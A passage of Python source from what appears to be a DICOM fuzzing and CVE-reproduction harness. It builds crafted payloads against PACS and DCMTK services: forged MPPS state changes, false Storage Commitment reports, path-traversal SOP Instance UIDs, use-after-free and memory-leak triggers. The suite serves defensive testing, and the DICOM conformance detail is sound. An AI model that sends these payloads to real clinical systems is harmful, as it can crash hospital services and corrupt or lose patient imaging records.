    """Wrap a DIMSE-N command (and optional data set) in one P-DATA-TF."""
    pdv_items = [PresentationDataValueItem(
        context_id=context_id, is_last=1, is_command=1, data=raw(command_pkt),
    )]
    if dataset is not None:
        pdv_items.append(PresentationDataValueItem(
            context_id=context_id, is_last=1, is_command=0, data=dataset,
        ))
    return raw(DICOM() / P_DATA_TF(pdv_items=pdv_items))


def _n_service_sequence(command_pkt,
                        sop_class_uid: str,
                        dataset: Optional[bytes] = None,
                        called_ae: str = 'MPPSSCP') -> Tuple[bytes, List[bytes]]:
    """A-ASSOCIATE-RQ || DIMSE-N P-DATA-TF || A-RELEASE-RQ."""
    assoc = raw_associate_rq(called_ae, 'C-SCARE-FZ', sop_class_uid)
    pdata = _n_pdata_bytes(command_pkt, dataset)
    release = raw_release_rq()
    steps = [assoc, pdata, release]
    return b''.join(steps), steps


def _dimse_n_metadata(service: str, command: str, **extra) -> Dict[str, Any]:
    metadata = {
        'service_class': service,
        'dimse_command': command,
        'target_role': 'scp-server',
        'delivery': 'dicom-sequence',
        'reference': 'PS3.4 Annex F (MPPS) / Annex J (Storage Commitment)',
    }
    metadata.update(extra)
    return metadata


class DimseNAttacks:
    """
    DIMSE-N normalized service abuse: MPPS and Storage Commitment.

    The C-services (STORE/FIND/MOVE/GET) get almost all the testing attention,
    but a PACS that supports worklists also speaks N-CREATE/N-SET for Modality
    Performed Procedure Step and N-ACTION/N-EVENT-REPORT for Storage
    Commitment. Those handlers are usually newer, less exercised, and — unlike
    C-STORE — they mutate *workflow state* rather than just storing an object,
    so the interesting failures are logic failures: unauthorized state
    transitions, forged transaction identity, and unsolicited results.

    Each payload is a full A-ASSOCIATE-RQ / P-DATA-TF / A-RELEASE-RQ sequence
    in ``metadata['steps']``; deliver with ``deliver.send_sequence``.
    """

    _MPPS_INSTANCE = '1.2.826.0.1.3680043.10.543.700.1'

    @staticmethod
    def _mpps_dataset(status: str, extra: Optional[List[Element]] = None) -> bytes:
        ds = Dataset()
        ds = ds / Element(0x0040, 0x0252, 'CS', status)   # Performed Procedure Step Status
        ds = ds / Element(0x0040, 0x0253, 'SH', 'C-SCARE')  # PPS ID
        ds = ds / Element(0x0008, 0x0060, 'CS', 'OT')
        for element in (extra or []):
            ds = ds / element
        return ds.encode(implicit_vr=True)

    # -------------------------------------------------------------------------
    # Modality Performed Procedure Step (PS3.4 Annex F)
    # -------------------------------------------------------------------------

    @classmethod
    def mpps_ncreate_dataset_flag_without_data(cls) -> AttackResult:
        """N-CREATE says a data set follows, then sends none.

        MPPS N-CREATE is meaningless without its attribute list, so a handler
        that trusts Command Data Set Type reaches its attribute lookup with
        nothing behind it.
        """
        cmd = N_CREATE_RQ(
            affected_sop_class_uid=MPPS_SOP_CLASS_UID,
            message_id=1,
            data_set_type=0x0102,      # a data set is present
            affected_sop_instance_uid=cls._MPPS_INSTANCE,
        )
        payload, steps = _n_service_sequence(cmd, MPPS_SOP_CLASS_UID, dataset=None)
        return AttackResult(
            name='dimse_n_mpps_ncreate_dataset_flag_without_data',
            category='dimse_n',
            payload=payload,
            description='MPPS N-CREATE-RQ declares a data set but sends only the command',
            expected_behavior='SCP should fail the operation rather than read an '
                              'absent attribute list',
            metadata=_dimse_n_metadata(
                'MPPS', 'N-CREATE-RQ', steps=steps,
                bug_class='command-vs-dataset-mismatch',
                target_sop_class=MPPS_SOP_CLASS_UID),
        )

    @classmethod
    def mpps_nset_unknown_instance(cls) -> AttackResult:
        """N-SET against an MPPS instance that was never created."""
        cmd = N_SET_RQ(
            requested_sop_class_uid=MPPS_SOP_CLASS_UID,
            message_id=2,
            data_set_type=0x0102,
            requested_sop_instance_uid='1.2.826.0.1.3680043.10.543.700.999',
        )
        dataset = cls._mpps_dataset('COMPLETED')
        payload, steps = _n_service_sequence(cmd, MPPS_SOP_CLASS_UID, dataset)
        return AttackResult(
            name='dimse_n_mpps_nset_unknown_instance',
            category='dimse_n',
            payload=payload,
            description='MPPS N-SET-RQ updates a Performed Procedure Step that '
                        'no N-CREATE ever established',
            expected_behavior='SCP should return "no such object instance" '
                              '(0x0112), not create or update state',
            metadata=_dimse_n_metadata(
                'MPPS', 'N-SET-RQ', steps=steps,
                bug_class='missing-instance-check',
                target_sop_class=MPPS_SOP_CLASS_UID),
        )

    @classmethod
    def mpps_nset_reopen_completed_step(cls) -> AttackResult:
        """N-SET moving a COMPLETED procedure step back to IN PROGRESS.

        PS3.4 F.7.2 makes COMPLETED and DISCONTINUED final. A step that can be
        reopened lets a caller rewrite the performed-procedure record that
        billing and audit read from.
        """
        cmd = N_SET_RQ(
            requested_sop_class_uid=MPPS_SOP_CLASS_UID,
            message_id=3,
            data_set_type=0x0102,
            requested_sop_instance_uid=cls._MPPS_INSTANCE,
        )
        dataset = cls._mpps_dataset('IN PROGRESS')
        payload, steps = _n_service_sequence(cmd, MPPS_SOP_CLASS_UID, dataset)
        return AttackResult(
            name='dimse_n_mpps_nset_reopen_completed_step',
            category='dimse_n',
            payload=payload,
            description='MPPS N-SET-RQ sets Performed Procedure Step Status back '
                        'to IN PROGRESS',
            expected_behavior='SCP must refuse to leave a COMPLETED or '
                              'DISCONTINUED step (PS3.4 F.7.2)',
            metadata=_dimse_n_metadata(
                'MPPS', 'N-SET-RQ', steps=steps,
                bug_class='illegal-state-transition',
                target_field='(0040,0252) Performed Procedure Step Status',
                target_sop_class=MPPS_SOP_CLASS_UID),
        )

    @classmethod
    def mpps_nset_final_state_undefined_value(cls) -> AttackResult:
        """N-SET with a Performed Procedure Step Status outside the enum."""
        cmd = N_SET_RQ(
            requested_sop_class_uid=MPPS_SOP_CLASS_UID,
            message_id=4,
            data_set_type=0x0102,
            requested_sop_instance_uid=cls._MPPS_INSTANCE,
        )
        dataset = cls._mpps_dataset('C-SCARE-UNDEF')
        payload, steps = _n_service_sequence(cmd, MPPS_SOP_CLASS_UID, dataset)
        return AttackResult(
            name='dimse_n_mpps_nset_undefined_status',
            category='dimse_n',
            payload=payload,
            description='MPPS N-SET-RQ carries a Performed Procedure Step Status '
                        'outside the defined enumeration',
            expected_behavior='SCP should reject an undefined enumerated value '
                              'rather than store or dispatch on it',
            metadata=_dimse_n_metadata(
                'MPPS', 'N-SET-RQ', steps=steps,
                bug_class='unvalidated-enumerated-value',
                target_field='(0040,0252) Performed Procedure Step Status',
                target_sop_class=MPPS_SOP_CLASS_UID),
        )

    @classmethod
    def mpps_ncreate_duplicate_instance(cls) -> AttackResult:
        """Two N-CREATEs claiming the same Affected SOP Instance UID."""
        dataset = cls._mpps_dataset('IN PROGRESS')
        assoc = raw_associate_rq('MPPSSCP', 'C-SCARE-FZ', MPPS_SOP_CLASS_UID)
        first = _n_pdata_bytes(N_CREATE_RQ(
            affected_sop_class_uid=MPPS_SOP_CLASS_UID, message_id=5,
            data_set_type=0x0102,
            affected_sop_instance_uid=cls._MPPS_INSTANCE), dataset)
        second = _n_pdata_bytes(N_CREATE_RQ(
            affected_sop_class_uid=MPPS_SOP_CLASS_UID, message_id=6,
            data_set_type=0x0102,
            affected_sop_instance_uid=cls._MPPS_INSTANCE), dataset)
        steps = [assoc, first, second, raw_release_rq()]
        return AttackResult(
            name='dimse_n_mpps_ncreate_duplicate_instance',
            category='dimse_n',
            payload=b''.join(steps),
            description='Two MPPS N-CREATE-RQs claim the same SOP Instance UID '
                        'in one association',
            expected_behavior='SCP should reject the second with "duplicate SOP '
                              'instance" (0x0111) rather than overwrite the first',
            metadata=_dimse_n_metadata(
                'MPPS', 'N-CREATE-RQ', steps=steps,
                bug_class='duplicate-instance-overwrite',
                target_sop_class=MPPS_SOP_CLASS_UID),
        )

    # -------------------------------------------------------------------------
    # Storage Commitment Push Model (PS3.4 Annex J)
    # -------------------------------------------------------------------------

    @classmethod
    def storage_commitment_naction_unstored_instances(cls) -> AttackResult:
        """Commitment request naming instances the SCP never received.

        The SCP must answer with a Failed SOP Sequence. One that reports
        success for objects it does not hold gives the SCU permission to
        delete its only copy.
        """
        ds = Dataset()
        ds = ds / Element(0x0008, 0x1195, 'UI', '1.2.826.0.1.3680043.10.543.701.1')
        ds = ds / Element(0x0008, 0x1199, 'SQ', b'')     # Referenced SOP Sequence
        ds = ds / Element(0x0008, 0x1150, 'UI', CT_IMAGE_STORAGE_SOP_CLASS_UID)
        ds = ds / Element(0x0008, 0x1155, 'UI', '1.2.826.0.1.3680043.10.543.701.404')
        cmd = N_ACTION_RQ(
            requested_sop_class_uid=STORAGE_COMMITMENT_SOP_CLASS_UID,
            message_id=7,
            data_set_type=0x0102,
            requested_sop_instance_uid=STORAGE_COMMITMENT_SOP_INSTANCE_UID,
            action_type_id=1,
        )
        payload, steps = _n_service_sequence(
            cmd, STORAGE_COMMITMENT_SOP_CLASS_UID, ds.encode(implicit_vr=True),
            called_ae='COMMITSCP')
        return AttackResult(
            name='dimse_n_storage_commitment_unstored_instances',
            category='dimse_n',
            payload=payload,
            description='Storage Commitment N-ACTION-RQ requests commitment for '
                        'a SOP Instance the SCP never stored',
            expected_behavior='SCP must report the instance in the Failed SOP '
                              'Sequence, never as committed',
            metadata=_dimse_n_metadata(
                'Storage Commitment', 'N-ACTION-RQ', steps=steps,
                bug_class='false-commitment',
                target_field='(0008,1199) Referenced SOP Sequence',
                target_sop_class=STORAGE_COMMITMENT_SOP_CLASS_UID),
        )

    @classmethod
    def storage_commitment_naction_invalid_action_type(cls) -> AttackResult:
        """Commitment N-ACTION with an action type PS3.4 J does not define."""
        cmd = N_ACTION_RQ(
            requested_sop_class_uid=STORAGE_COMMITMENT_SOP_CLASS_UID,
            message_id=8,
            data_set_type=0x0101,           # no data set
            requested_sop_instance_uid=STORAGE_COMMITMENT_SOP_INSTANCE_UID,
            action_type_id=0xFFFF,
        )
        payload, steps = _n_service_sequence(
            cmd, STORAGE_COMMITMENT_SOP_CLASS_UID, called_ae='COMMITSCP')
        return AttackResult(
            name='dimse_n_storage_commitment_invalid_action_type',
            category='dimse_n',
            payload=payload,
            description='Storage Commitment N-ACTION-RQ uses Action Type ID '
                        '0xFFFF (only 1 is defined)',
            expected_behavior='SCP should return "no such action type" (0x0123) '
                              'without indexing an action table on it',
            metadata=_dimse_n_metadata(
                'Storage Commitment', 'N-ACTION-RQ', steps=steps,
                bug_class='unvalidated-type-dispatch',
                action_type_id=0xFFFF,
                target_sop_class=STORAGE_COMMITMENT_SOP_CLASS_UID),
        )

    @classmethod
    def storage_commitment_unsolicited_event_report(cls) -> AttackResult:
        """N-EVENT-REPORT pushed without any prior N-ACTION request.

        Commitment results normally arrive on a *separate* association from
        the SCP. An implementation that accepts a result it never asked for
        can be told that objects are safely committed by any peer that can
        reach its listening port.
        """
        ds = Dataset()
        ds = ds / Element(0x0008, 0x1195, 'UI', '1.2.826.0.1.3680043.10.543.701.2')
        ds = ds / Element(0x0008, 0x1199, 'SQ', b'')
        ds = ds / Element(0x0008, 0x1150, 'UI', CT_IMAGE_STORAGE_SOP_CLASS_UID)
        ds = ds / Element(0x0008, 0x1155, 'UI', '1.2.826.0.1.3680043.10.543.701.7')
        cmd = N_EVENT_REPORT_RQ(
            affected_sop_class_uid=STORAGE_COMMITMENT_SOP_CLASS_UID,
            message_id=9,
            data_set_type=0x0102,
            affected_sop_instance_uid=STORAGE_COMMITMENT_SOP_INSTANCE_UID,
            event_type_id=1,                # 1 = Storage Commitment Request Successful
        )
        payload, steps = _n_service_sequence(
            cmd, STORAGE_COMMITMENT_SOP_CLASS_UID, ds.encode(implicit_vr=True),
            called_ae='COMMITSCU')
        return AttackResult(
            name='dimse_n_storage_commitment_unsolicited_event_report',
            category='dimse_n',
            payload=payload,
            description='Unsolicited Storage Commitment N-EVENT-REPORT-RQ reports '
                        'success for a Transaction UID the receiver never issued',
            expected_behavior='Receiver must correlate the Transaction UID to an '
                              'outstanding request it made, and ignore the rest',
            metadata=_dimse_n_metadata(
                'Storage Commitment', 'N-EVENT-REPORT-RQ', steps=steps,
                bug_class='unsolicited-result-acceptance',
                target_field='(0008,1195) Transaction UID',
                target_sop_class=STORAGE_COMMITMENT_SOP_CLASS_UID),
        )

    @classmethod
    def storage_commitment_event_report_invalid_event_type(cls) -> AttackResult:
        """Commitment N-EVENT-REPORT with an event type outside PS3.4 J."""
        cmd = N_EVENT_REPORT_RQ(
            affected_sop_class_uid=STORAGE_COMMITMENT_SOP_CLASS_UID,
            message_id=10,
            data_set_type=0x0101,
            affected_sop_instance_uid=STORAGE_COMMITMENT_SOP_INSTANCE_UID,
            event_type_id=0xFFFF,
        )
        payload, steps = _n_service_sequence(
            cmd, STORAGE_COMMITMENT_SOP_CLASS_UID, called_ae='COMMITSCU')
        return AttackResult(
            name='dimse_n_storage_commitment_invalid_event_type',
            category='dimse_n',
            payload=payload,
            description='Storage Commitment N-EVENT-REPORT-RQ uses Event Type ID '
                        '0xFFFF (only 1 and 2 are defined)',
            expected_behavior='Receiver should return "no such event type" '
                              '(0x0113) without indexing on the value',
            metadata=_dimse_n_metadata(
                'Storage Commitment', 'N-EVENT-REPORT-RQ', steps=steps,
                bug_class='unvalidated-type-dispatch',
                event_type_id=0xFFFF,
                target_sop_class=STORAGE_COMMITMENT_SOP_CLASS_UID),
        )

    # -------------------------------------------------------------------------
    # Generic normalized-service handling
    # -------------------------------------------------------------------------

    @classmethod
    def n_get_attribute_list_bomb(cls, count: int = 8192) -> AttackResult:
        """N-GET whose Attribute Identifier List repeats one tag ``count`` times.

        (0000,1005) is VR AT with VM 1-n, so a long list is legal encoding.
        The question is whether the SCP bounds the list before allocating a
        result per requested attribute.
        """
        cmd = N_GET_RQ(
            requested_sop_class_uid=MPPS_SOP_CLASS_UID,
            message_id=11,
            data_set_type=0x0101,
            requested_sop_instance_uid=cls._MPPS_INSTANCE,
            attribute_identifier_list=[(0x0040, 0x0252)] * count,
        )
        payload, steps = _n_service_sequence(cmd, MPPS_SOP_CLASS_UID)
        return AttackResult(
            name='dimse_n_get_attribute_list_bomb',
            category='dimse_n',
            payload=payload,
            description=f'N-GET-RQ Attribute Identifier List repeats one tag {count} times',
            expected_behavior='SCP should bound the requested attribute list '
                              'before allocating per-attribute state',
            metadata=_dimse_n_metadata(
                'MPPS', 'N-GET-RQ', steps=steps,
                bug_class='unbounded-value-multiplicity',
                target_field='(0000,1005) Attribute Identifier List',
                requested_attribute_count=count,
                target_sop_class=MPPS_SOP_CLASS_UID),
        )

    @classmethod
    def n_delete_well_known_instance(cls) -> AttackResult:
        """N-DELETE aimed at the well-known Storage Commitment SOP instance.

        1.2.840.10008.1.20.1.1 is fixed by the standard and is not a
        deletable object; an SCP that routes it into a generic instance-delete
        path can lose the commitment service for every peer.
        """
        cmd = N_DELETE_RQ(
            requested_sop_class_uid=STORAGE_COMMITMENT_SOP_CLASS_UID,
            message_id=12,
            data_set_type=0x0101,
            requested_sop_instance_uid=STORAGE_COMMITMENT_SOP_INSTANCE_UID,
        )
        payload, steps = _n_service_sequence(
            cmd, STORAGE_COMMITMENT_SOP_CLASS_UID, called_ae='COMMITSCP')
        return AttackResult(
            name='dimse_n_delete_well_known_instance',
            category='dimse_n',
            payload=payload,
            description='N-DELETE-RQ targets the well-known Storage Commitment '
                        'SOP Instance 1.2.840.10008.1.20.1.1',
            expected_behavior='SCP must refuse to delete a standard well-known '
                              'SOP instance',
            metadata=_dimse_n_metadata(
                'Storage Commitment', 'N-DELETE-RQ', steps=steps,
                bug_class='well-known-instance-deletion',
                target_sop_class=STORAGE_COMMITMENT_SOP_CLASS_UID),
        )

    @classmethod
    def all(cls) -> Generator[AttackResult, None, None]:
        """Yield every DIMSE-N normalized-service attack payload."""
        yield cls.mpps_ncreate_dataset_flag_without_data()
        yield cls.mpps_nset_unknown_instance()
        yield cls.mpps_nset_reopen_completed_step()
        yield cls.mpps_nset_final_state_undefined_value()
        yield cls.mpps_ncreate_duplicate_instance()
        yield cls.storage_commitment_naction_unstored_instances()
        yield cls.storage_commitment_naction_invalid_action_type()
        yield cls.storage_commitment_unsolicited_event_report()
        yield cls.storage_commitment_event_report_invalid_event_type()
        yield cls.n_get_attribute_list_bomb()
        yield cls.n_delete_well_known_instance()


class CVEAttacks:
    """
    CVE-specific test cases organized by CVE number.
    
    Each method generates one or more AttackResult objects that reproduce
    the conditions described in the CVE.
    """

    # -------------------------------------------------------------------------
    # CVE-2023-32135: Use-After-Free in DCM File Parsing
    # -------------------------------------------------------------------------
    
    @staticmethod
    def cve_2023_32135_sequence_uaf() -> List[AttackResult]:
        """
        CVE-2023-32135: Use-After-Free in DCM File Parsing
        
        The parser attempts to access DICOM elements after referenced
        memory has been freed. Tests sequence pointer attacks.
        """
        results = []
        
        # Test 1: Omit critical sequence tags
        data = struct.pack('<HH', 0x7FE0, 0x0010)  # Pixel Data tag
        data += b'SQ'
        data += b'\x00\x00'
        data += struct.pack('<I', 0xFFFFFFFF)  # Undefined length
        # No sequence items - reference will dangle
        data += struct.pack('<HH', 0xFFFE, 0xE0DD)  # Sequence delim
        data += struct.pack('<I', 0)
        
        results.append(AttackResult(
            name='cve_2023_32135_01_missing_sequence_items',
            category='cve',
            payload=data,
            description='Sequence with undefined length but no items',
            expected_behavior='Parser may access freed sequence memory',
            metadata={'cve': 'CVE-2023-32135',
                      'bug_class': 'dangling-sequence-reference',
                      'delivery_hint': 'cstore'}
        ))
        
        # Test 2: Invalid nested dataset pointers (beyond EOF)
        data = struct.pack('<HH', 0x0008, 0x1115)  # Referenced Series Sequence
        data += b'SQ'
        data += b'\x00\x00'
        data += struct.pack('<I', 0xFFFFFFFF)
        data += struct.pack('<HH', 0xFFFE, 0xE000)  # Item
        data += struct.pack('<I', 0x7FFFFFFF)  # Points way beyond EOF
        # No actual item data
        
        results.append(AttackResult(
            name='cve_2023_32135_02_invalid_nested_pointer',
            category='cve',
            payload=data,
            description='Sequence item with offset beyond EOF',
            expected_behavior='Parser should detect invalid offset',
            metadata={'cve': 'CVE-2023-32135',
                      'bug_class': 'oob-item-length',
                      'delivery_hint': 'cstore'}
        ))
        
        # Test 3: Premature sequence termination (truncated file)
        data = struct.pack('<HH', 0x0040, 0xA730)  # Content Sequence
        data += b'SQ'
        data += b'\x00\x00'
        data += struct.pack('<I', 0xFFFFFFFF)
        data += struct.pack('<HH', 0xFFFE, 0xE000)  # Item start
        data += struct.pack('<I', 0xFFFFFFFF)
        data += struct.pack('<HH', 0x0008, 0x0100)  # Some element
        # Truncate here - no delimiters
        
        results.append(AttackResult(
            name='cve_2023_32135_03_premature_termination',
            category='cve',
            payload=data,
            description='Sequence truncated without delimiters',
            expected_behavior='Parser may leave dangling references',
            metadata={'cve': 'CVE-2023-32135',
                      'bug_class': 'truncated-sequence',
                      'delivery_hint': 'cstore'}
        ))
        
        return results

    # -------------------------------------------------------------------------
    # ICSMA-26-181-01: OFFIS DCMTK Toolkit <= 3.7.0
    # -------------------------------------------------------------------------

    @staticmethod
    def cve_2026_50003_cget_bit_preserving_path_traversal() -> List[AttackResult]:
        """
        CVE-2026-50003: a hostile C-GET SCP can make a DCMTK client using
        bit-preserving storage write outside the selected output directory.
        """
        results = []
        payloads = [
            ('relative', '../../outside-cget/c-scare-cget.dcm'),
            ('absolute', '/tmp/c-scare-cget/escaped.dcm'),
        ]
        for payload_id, path_value in payloads:
            ds = _injection_base_dataset()
            ds[0x00080018] = Element(0x0008, 0x0018, 'UI', path_value)
            metadata = _icsma_metadata(
                'CVE-2026-50003',
                'CWE-22',
                'rogue C-GET SCP feeding a DCMTK client in bit-preserving '
                'storage mode',
                'instrumented C-GET SCU/client-response harness seeded with '
                'path-bearing C-STORE sub-operations',
                'DCMTK C-GET client',
            )
            metadata.update({
                'target_role': 'scu-client',
                'delivery': 'hostile-cget-cstore',
                'target_field': '(0008,0018) SOP Instance UID',
                'traversal_payload': path_value,
                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
                'sop_instance_uid': path_value,
            })
            results.append(AttackResult(
                name=f'cve_2026_50003_cget_bit_preserving_{payload_id}',
                category='cve',
                payload=ds.encode(),
                description='C-GET C-STORE sub-operation carries a path-like '
                            f'SOP Instance UID ({payload_id})',
                expected_behavior='Client must confine bit-preserved output to '
                                  'the selected storage directory',
                metadata=metadata,
            ))
        return results

    @staticmethod
    def cve_2026_50254_storescp_association_leak() -> List[AttackResult]:
        """CVE-2026-50254: repeated crafted connection requests leak memory
        in storescp single-process mode."""
        malformed_max_length = raw_item(0x51, b'')
        payload = raw_associate_rq(
            'STORESCP',
            'C-SCARE-FZ',
            CT_IMAGE_STORAGE_SOP_CLASS_UID,
            user_info_payload=malformed_max_length,
        )
        metadata = _icsma_metadata(
            'CVE-2026-50254',
            'CWE-401',
            'repeat this single A-ASSOCIATE-RQ against a live storescp and '
            'watch RSS/availability',
            'AFLNet net-storescp with LSan triage and --include-queue leak '
            'replays',
            'storescp',
        )
        metadata.update({
            'target_role': 'scp-server',
            'delivery': 'raw-pdu',
            'repeat_for_detection': 1000,
            'expected_monitor': 'memory-growth-or-lsan',
            'bug_class': 'truncated-user-information-item',
        })
        return [AttackResult(
            name='cve_2026_50254_storescp_assoc_leak_truncated_max_length',
            category='cve',
            payload=payload,
            description='storescp association request with a malformed Maximum '
                        'Length user-information sub-item',
            expected_behavior='storescp must reject the association and release '
                              'all per-request allocations',
            metadata=metadata,
        )]

    @staticmethod
    def cve_2026_35505_association_request_leak() -> List[AttackResult]:
        """CVE-2026-35505: repeated crafted connection requests leak memory
        until a single-process service is killed."""
        duplicate_max_length = raw_item(0x51, struct.pack('!I', 0))
        duplicate_max_length += raw_item(0x51, struct.pack('!I', 0xFFFFFFFF))
        payload = raw_associate_rq(
            'DCMQRSCP',
            'C-SCARE-FZ',
            VERIFICATION_SOP_CLASS_UID,
            user_info_payload=duplicate_max_length,
        )
        metadata = _icsma_metadata(
            'CVE-2026-35505',
            'CWE-401',
            'repeat crafted A-ASSOCIATE-RQ against the affected single-process '
            'DCMTK SCP and watch RSS/availability',
            'AFLNet network SCP profile with LSan triage and queue replay for '
            'leak-only findings',
            'DCMTK single-process SCP',
        )
        metadata.update({
            'target_role': 'scp-server',
            'delivery': 'raw-pdu',
            'repeat_for_detection': 1000,
            'expected_monitor': 'memory-growth-or-lsan',
        })
        return [AttackResult(
            name='cve_2026_35505_assoc_leak_duplicate_max_length',
            category='cve',
            payload=payload,
            description='Association request carries duplicate Maximum Length '
                        'sub-items with conflicting values',
            expected_behavior='SCP must reject or normalize the association and '
                              'release all per-request allocations',
            metadata=metadata,
        )]

    @staticmethod
    def cve_2026_52868_worklist_directory_escape() -> List[AttackResult]:
        """CVE-2026-52868: worklist query escapes the intended per-AE
        worklist storage area."""
        identifier = Dataset()
        identifier = identifier / Element(0x0008, 0x0050, 'SH', '')
        identifier = identifier / Element(0x0010, 0x0010, 'PN', '')
        identifier = identifier / Element(0x0010, 0x0020, 'LO', '')
        assoc = raw_associate_rq(
            '../ORTHO',
            'C-SCARE-FZ',
            MODALITY_WORKLIST_FIND_SOP_CLASS_UID,
        )
        pdata = _cfind_pdata_bytes(identifier)
        release = raw_release_rq()
        metadata = _icsma_metadata(
            'CVE-2026-52868',
            'CWE-22',
            'C-FIND against a worklist SCP configured with multiple per-AE '
            'storage areas, using a traversal-shaped Called AE Title',
            'future AFLNet net-dcmwlm/worklist profile with per-AE directory '
            'fixtures and response-diff oracle',
            'DCMTK worklist SCP',
        )
        metadata.update({
            'target_role': 'scp-server',
            'delivery': 'dicom-cfind-sequence',
            'query_sop_class_uid': MODALITY_WORKLIST_FIND_SOP_CLASS_UID,
            'called_ae_title': '../ORTHO',
            'greybox_prerequisite': 'add an instrumented worklist SCP target '
                                    'profile; net-dcmqrscp is not a worklist '
                                    'server',
            'steps': [assoc, pdata, release],
        })
        return [AttackResult(
            name='cve_2026_52868_worklist_called_ae_traversal',
            category='cve',
            payload=assoc + pdata + release,
            description='Modality Worklist C-FIND uses a traversal-shaped '
                        'Called AE Title to probe per-AE directory isolation',
            expected_behavior='Worklist SCP must not return records outside '
                              'the Called AE Title storage area',
            metadata=metadata,
        )]

    @staticmethod
    def cve_2026_44628_worklist_type_confusion() -> List[AttackResult]:
        """CVE-2026-44628: crafted worklist query can crash the worklist
        server when normal storage/lockfile/record preconditions exist."""
        identifier = Dataset()
        identifier = identifier / Element(0x0008, 0x0060, 'CS', 'CT')
        identifier = identifier / Element(0x0010, 0x0010, 'PN', '*')
        identifier = identifier / Element(0x0040, 0x0100, 'LO', 'not-a-sequence')
        assoc = raw_associate_rq(
            'WORKLIST',
            'C-SCARE-FZ',
            MODALITY_WORKLIST_FIND_SOP_CLASS_UID,
        )
        pdata = _cfind_pdata_bytes(identifier, message_id=2)
        release = raw_release_rq()
        metadata = _icsma_metadata(
            'CVE-2026-44628',
            'CWE-843',
            'single C-FIND against a seeded worklist SCP with valid Called AE, '
            'storage directory, lockfile, and at least one matching record',
            'future AFLNet net-dcmwlm/worklist profile with seeded records and '
            'ASan/UBSan crash triage',
            'DCMTK worklist SCP',
        )
        metadata.update({
            'target_role': 'scp-server',
            'delivery': 'dicom-cfind-sequence',
            'query_sop_class_uid': MODALITY_WORKLIST_FIND_SOP_CLASS_UID,
            'called_ae_title': 'WORKLIST',
            'target_field': '(0040,0100) Scheduled Procedure Step Sequence',
            'type_confusion': 'SQ tag encoded as LO scalar',
            'preconditions': [
                'valid Called AE Title',
                'configured worklist storage directory',
                'expected lockfile exists',
                'at least one matching worklist record',
            ],
            'greybox_prerequisite': 'add an instrumented worklist SCP target '
                                    'profile; net-dcmqrscp is not a worklist '
                                    'server',
            'steps': [assoc, pdata, release],
        })
        return [AttackResult(
            name='cve_2026_44628_worklist_sps_sequence_type_confusion',
            category='cve',
            payload=assoc + pdata + release,
            description='Modality Worklist C-FIND encodes Scheduled Procedure '
                        'Step Sequence as a scalar LO value',
            expected_behavior='Worklist SCP must reject the mistyped key without '
                              'crashing',
            metadata=metadata,
        )]
    
    # -------------------------------------------------------------------------
    # CVE-2024-24793: Use-After-Free in File Meta Information
    # -------------------------------------------------------------------------
    
    @staticmethod
    def cve_2024_24793_duplicate_meta_tags() -> List[AttackResult]:
        """
        CVE-2024-24793: Use-After-Free in File Meta Information
        
        When inserting duplicate tags into File Meta Information header,
        the element is freed but still referenced.

        The duplicate is the attack, so everything around it is conformant:
        a full Type 1 File Meta group with a (0002,0000) Group Length that
        spans the duplicate, and a Data Set behind it. Emitting the preamble,
        ``DICM`` and the bare duplicate left a file with no group length and
        no Transfer Syntax UID, which ``DcmMetaInfo::read`` rejects at the
        header — the duplicate-insertion path that holds the use-after-free
        was never reached, and the run recorded a rejection that said nothing
        about the bug.
        """
        results = []

        def duplicated(tag_element: int, duplicate: Element, **meta_kw):
            """Standard meta with ``duplicate`` inserted after its original.

            Placing it immediately after the element it duplicates is what a
            parser meets in the wild, and keeps the rest of the group in the
            ascending tag order PS3.5 §7.1 requires.
            """
            meta = standard_file_meta(**meta_kw)
            at = max(i for i, e in enumerate(meta)
                     if e.tag.element == tag_element) + 1
            meta.insert(at, duplicate)
            return part10_file(meta, dataset=minimal_dataset())

        # Test 1: Duplicate Transfer Syntax UID
        results.append(AttackResult(
            name='cve_2024_24793_01_duplicate_transfer_syntax',
            category='cve',
            payload=duplicated(
                0x0010, Element(0x0002, 0x0010, 'UI', EXPLICIT_VR_LE_UID),
                transfer_syntax='1.2.840.10008.1.2'),
            description='Two Transfer Syntax UID elements in meta header',
            expected_behavior='Parser may UAF on duplicate insertion',
            metadata={'cve': 'CVE-2024-24793',
                      'bug_class': 'duplicate-meta-element'}
        ))

        # Test 2: Duplicate Media Storage SOP Class
        results.append(AttackResult(
            name='cve_2024_24793_02_duplicate_sop_class',
            category='cve',
            payload=duplicated(
                0x0002, Element(0x0002, 0x0002, 'UI',
                                '1.2.840.10008.5.1.4.1.1.4'),
                sop_class_uid='1.2.840.10008.5.1.4.1.1.2'),
            description='Two Media Storage SOP Class elements',
            expected_behavior='Parser may UAF on duplicate',
            metadata={'cve': 'CVE-2024-24793',
                      'bug_class': 'duplicate-meta-element'}
        ))

        # Test 3: Duplicate with different VRs. 'LO' rather than 'UI' for the
        # same tag, so a parser that keys its free on the first VR and its
        # read on the second disagrees with itself about the value's length.
        results.append(AttackResult(
            name='cve_2024_24793_03_duplicate_different_vr',
            category='cve',
            payload=duplicated(
                0x0010, Element(0x0002, 0x0010, 'LO', EXPLICIT_VR_LE_UID),
                transfer_syntax='1.2.840.10008.1.2'),
            description='Duplicate tag with conflicting VRs',
            expected_behavior='Parser confusion on VR',
            metadata={'cve': 'CVE-2024-24793',
                      'bug_class': 'duplicate-meta-element-vr-conflict'}
        ))

        # Test 4: Rapid duplicate sequence (many duplicates)
        meta = standard_file_meta(transfer_syntax='1.2.840.10008.1.2')
        at = max(i for i, e in enumerate(meta) if e.tag.element == 0x0010) + 1
        for _ in range(9):
            meta.insert(at, Element(0x0002, 0x0010, 'UI', '1.2.840.10008.1.2'))
        results.append(AttackResult(
            name='cve_2024_24793_04_rapid_duplicates',
            category='cve',
            payload=part10_file(meta, dataset=minimal_dataset()),
            description='10 consecutive duplicate Transfer Syntax tags',
            expected_behavior='Multiple UAF opportunities',
            metadata={'cve': 'CVE-2024-24793',
                      'bug_class': 'duplicate-meta-element'}
        ))

        return results
    
    # -------------------------------------------------------------------------
    # CVE-2024-24794: Use-After-Free in Sequence Value Representation
    # -------------------------------------------------------------------------
    
    @staticmethod
    def cve_2024_24794_sequence_duplicates() -> List[AttackResult]:
        """
        CVE-2024-24794: Use-After-Free in Sequence parsing
        
        Similar to CVE-2024-24793 but occurs in nested sequence parsing.
        """
        results = []
        
        # Test 1: Duplicate tags in nested sequence
        data = struct.pack('<HH', 0x0008, 0x1115)  # Referenced Series Sequence
        data += b'SQ'
        data += b'\x00\x00'
